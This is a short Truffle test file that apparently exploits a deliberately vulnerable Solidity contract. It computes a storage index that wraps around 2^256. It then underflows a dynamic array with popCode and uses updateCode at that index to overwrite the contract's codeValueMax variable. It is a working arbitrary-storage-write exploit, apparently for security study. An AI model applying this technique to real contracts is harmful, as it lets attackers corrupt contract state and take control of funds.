const StorageManipulatable = artifacts.require('./StorageManipulatable.sol');

contract('Storage Manipulation', async (accounts) => {
  it('success', async () => {
    let manipulatable = await StorageManipulatable.deployed();

    let codesStartIndex   = web3.utils.toBN(web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000002'));
    let codeValueMaxIndex = web3.utils.toBN(1).shln(256).sub(codesStartIndex).add(web3.utils.toBN(1));

    let codeValueMax;

    codeValueMax = await manipulatable.codeValueMax();
    assert.equal(9999, codeValueMax);

    await manipulatable.popCode();
    await manipulatable.updateCode(web3.utils.toHex(codeValueMaxIndex), 0);

    codeValueMax = await manipulatable.codeValueMax();
    assert.equal(0, codeValueMax);
  });
});
